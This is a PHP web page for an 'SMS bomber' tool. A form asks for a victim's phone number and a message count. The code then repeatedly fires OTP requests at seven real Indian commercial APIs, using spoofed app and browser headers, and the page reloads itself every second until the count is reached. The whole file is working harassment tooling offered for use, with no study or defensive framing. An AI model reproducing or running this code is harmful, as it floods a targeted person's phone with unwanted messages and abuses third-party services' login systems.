<?php
session_start();
?>
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Bombing Loop</title>
    <link rel="stylesheet" href="#" />
    <style>
     *{
        margin: 0px;
        padding: 0px;
        overflow: hidden;
        text-align: center;
    }
    

    .heading{
        display: flex;
    /*    background-image: linear-gradient(to right, rgba(255,0,0,0), rgba(255,0,0,1));      */
        height: 100px;
        justify-content: center;
        align-items: center;
    }

    .heading img{
        width: 100px;
    }

    input::-webkit-outer-spin-button,
    input::-webkit-inner-spin-button {
        -webkit-appearance: none;
        margin: 0;
    }
    .heading h2{
      color: white;
      font-family: "Courier", monospace;
    }
    
    .bg-img::before{
         content: ''; 

           /* background: url('images/smsBackground.jpg')  

                no-repeat center center/cover;     
                
            opacity: 0.7; 
                     */
            background: #1E1F31; 

            position: absolute; 

           

            top: 0px; 

            left: 0px; 

            width: 100vw; 

            height: 100vh; 

            z-index: -1;;
    }
    
    .form{
        display:flex;
        flex-direction: column;
        justify-content: center;
        align-items: center;

    }
    .forminput{
        font-size: 20px;
        text-align: center;
        border-radius: 23px;
        display: block;
        margin: 13px;
    } 

    .btns{
        display: block;
        background: rgba(240, 143, 83, 0.86);
        border: 0;
        color: white;
        font-family: Space Grotesk;
        text-transform: uppercase;
        transition: background 0.3s linear;
        cursor: pointer;
        border-radius: 30px;
        margin: auto;
        padding: 10px;
        font-size: 25px;
    }
    .btns:hover{
            background: #f08f53;
        }

    .footerbar{
        color: white;
        font-family: Space Grotesk;
        font-weight: bold;
        padding-top: 10px;
    /*
        font-family: "Luminari", fantasy;
        color: white;       */
    }

        .bomb-start{
            color: white;
            display: flex;
            padding-top: 10px;
            font-family: Space Grotesk;
            justify-content: center;
            align-items: center;
        }
        .bomb-count{
            display: flex;
            justify-content: center;
            align-items: center;
            color: red;
            padding-top: 10px;
        }
        #stop-btn{
            position: relative;
            display: inline-block;
            font-size: 18px;
            text-transform: uppercase;
            color: #fff;
            text-decoration: none;
            padding: 20px 30px;
            letter-spacing: 2px;
            font-weight: 500;
            margin-top: 15px;
        }
        #stop-btn:before{
content: '';
position: absolute;
top: 0;
left: 0;
width: 60px;
height: 60px;
border-radius: 50px;
background-color: #f09053;
z-index: -1;
transition: all ease 0.5s;
}
#stop-btn:hover:before{
width: 100%;
}
            
    
    </style>
  </head>
  <body>
      <div class="bg-img">
    <div class="heading">
      <a href="index.php"><img src="images/logo.gif"></a>
      <h2>SMS BOMBER</h2>
    </div>
    <?php
    

    
    
    if(isset($_GET['submit'])){
    $number = $_GET['number'];
    $getlimit = $_GET['countnumber'];
	$currentlimit=$_SESSION['limitset'];
		
    function RandomNumber($length)
{
$str="";
for($i=0;$i<$length;$i++){
$str.=mt_rand(0,9);
}
return $str;
}
$n = array('charan','raaghu','sumit','chandru','rishab','tanmay','ravi','riya','deepak','shashi','revanth','smitha','gowri','arun','arpitha','anusha','chinmay','thilak','manu','mithun','rahul','abhishek','kavya','kavitha','savitha','sachin','manohar','ajay','anurag','madhu','kushal','anil','askash','yogesh','vidya','rajesh','sagar','madhan','vishal','ramya','riyanth','ravishankar','radha','raju','sudha','avinash','fidju','arihanth','babu','priya','preethi','priyanka','preetham','suman','sunitha','tanu','manu','mahesh','mahendra','manoj','vikas','abhinav','arya','raaghu','sumit','chandru','rishab','tanmay','ravi','riya','deepak','shashi','revanth','smitha','gowri','arun','arpitha','anusha','chinmay','thilak','manu','mithun','rahul','abhishek','kavya','kavitha','savitha','sachin','manohar','ajay','anurag','madhu','kushal','anil','askash','yogesh','vidya','rajesh','sagar','madhan','vishal','ramya','riyanth','ravishankar','radha','raju','sudha','avinash','fidju','arihanth','babu','priya','preethi','priyanka','ananth','sumana','saritha','yogesh','razz');
$fname = $n[mt_rand(0,count($n))];	


$imei=RandomNumber(15);
$user=RandomNumber(21);

if("$currentlimit" == "$getlimit"){
echo"<span class='bomb-start'>successfully Bombed ".$getlimit."</span>"; exit;}
			
$url1='https://api.bestgoldindia.com/user/send-otp';

$data1='{"mobile":"'.$number.'"}';

$headers = ["Host: api.bestgoldindia.com","device-type: ANDROID","device-env: release","device-version: 2.24","app-version-code: 181","device-id: fa041017319bb0f5","accept-language: en","content-type: application/json; charset=UTF-8","accept-encoding: gzip"];

 $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL,$url1);
  curl_setopt($ch, CURLOPT_POSTFIELDS, $data1);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_HTTPHEADER,$headers);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
  $output= curl_exec ($ch);
  $json=json_decode($output,true);
  $msg = $json['message'];
  curl_close ($ch);

 $url2='https://www.industrybuying.com/user/api/send-otp/';

$data2='username='.$number.'';

$headers2= ['Host: www.industrybuying.com','user-agent: Mozilla/5.0 (Linux; Android 9; CPH2015) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36','content-type: application/x-www-form-urlencoded;charset=UTF-8','accept: application/json, text/plain, */*','origin: https://www.industrybuying.com','referer: https://www.industrybuying.com/user/login-phone','accept-encoding: gzip, deflate, br','accept-language: en-US,en;q=0.9'];


   $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL,$url2);
  curl_setopt($ch, CURLOPT_POSTFIELDS, $data2);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_HTTPHEADER,$headers2);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
  $output= curl_exec ($ch);
  $json=json_decode($output,true);
  $msg = $json['message'];
  curl_close ($ch);

$url3='https://www.dealshare.in/api/1.0/get-otp';

$data3='{"phoneNumber":"'.$number.'"}';

$headers3= ['www.dealshare.in','Accept: application/json, text/plain, */*','Content-Type: application/json','User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.54 Safari/537.36','Origin: https://www.dealshare.in','Referer: https://www.dealshare.in/','Accept-Encoding: gzip, deflate','Accept-Language: en-US,en;q=0.9'];


   $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL,$url3);
  curl_setopt($ch, CURLOPT_POSTFIELDS, $data3);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_HTTPHEADER,$headers3);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
  $output= curl_exec ($ch);
  $json=json_decode($output,true);
  $msg = $json['message'];
  curl_close ($ch);

$url4='https://api.snapmint.com/v1/public/sign_up';
$data4='{"mobile":"'.$number.'"}';
$headers4= ['Host: api.snapmint.com','User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36','Content-Type: application/json','Origin: https://snapmint.com','Referer: https://snapmint.com/','Accept-Encoding: gzip, deflate','Accept-Language: en-US,en;q=0.9'];

   $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL,$url4);
  curl_setopt($ch, CURLOPT_POSTFIELDS, $data4);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_HTTPHEADER,$headers4);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
  $output= curl_exec ($ch);
  $json=json_decode($output,true);
  $msg = $json['message'];
  curl_close ($ch);

$url5='https://www.medibuddy.in/unified-login/user/register';
$data5= '{"phonenumber":"'.$number.'"}';
$headers5= ['www.medibuddy.in','User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36','Content-Type: application/json','Accept: application/json, text/plain, */*','Origin: https://www.medibuddy.in','Referer: https://www.medibuddy.in/','Accept-Encoding: gzip, deflate','Accept-Language: en-US,en;q=0.9'];

   $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL,$url5);
  curl_setopt($ch, CURLOPT_POSTFIELDS, $data5);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_HTTPHEADER,$headers5);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
  $output= curl_exec ($ch);
  $json=json_decode($output,true);
  $msg = $json['message'];
  curl_close ($ch);

$url6='https://63ti5s0o80.execute-api.ap-south-1.amazonaws.com/Prod/nirawebloginapi';
$data6= '{"mobileNumber":"'.$number.'"}';
$headers6= ['Host: 63ti5s0o80.execute-api.ap-south-1.amazonaws.com','Accept: application/json, text/plain, */*','Content-Type: application/json','User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36','Origin: https://apply.nirafinance.com','Referer: https://apply.nirafinance.com/','Accept-Encoding: gzip, deflate','Accept-Language: en-US,en;q=0.9'];

   $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL,$url6);
  curl_setopt($ch, CURLOPT_POSTFIELDS, $data6);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_HTTPHEADER,$headers6);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
  $output= curl_exec ($ch);
  $json=json_decode($output,true);
  $msg = $json['message'];
  curl_close ($ch);

 $url7='https://api.spinny.com/api/c/user/otp-request/';
$data7= '{"contact_number":"'.$number.'"}';
$headers7= ['Host: api.spinny.com','User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36','Content-Type: application/json','Accept: */*','Origin: https://www.spinny.com','Accept-Encoding: gzip, deflate','Accept-Language: en-US,en;q=0.9'];

   $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL,$url7);
  curl_setopt($ch, CURLOPT_POSTFIELDS, $data7);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_HTTPHEADER,$headers7);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
  $output= curl_exec ($ch);
  $json=json_decode($output,true);
  $msg = $json['message'];
  curl_close ($ch);
  
  $_SESSION["limitset"] +="1";
echo "<span class='bomb-start'>Bombing Start On This No. : ".$number."</span>";
echo "<span class='bomb-count'>SMS => ".$currentlimit."</span>";
echo "<a href='smsBomb.php' id='stop-btn'>stop</a>";
echo "<meta http-equiv='refresh' content='1'>";

}
    if(!isset($_GET['submit'])){
    session_unset();
    session_destroy();
    echo'<div class="form">
      <form action="" method="GET">
          <input class="forminput" type="number" name="number" placeholder="Enter Number of Victim" />
          <input class="forminput"type="number" name="countnumber" placeholder="Enter No. Of SMS" />
        <input class="btns" type="submit" name="submit" />
      </form>
      <div class="footerbar">Developed By: Samarpan & Rakesh</div>
    </div>';
    }
    ?>
    </div>
    <script>
    function stopBomb(){
    }
    </script>
  </body>
</html>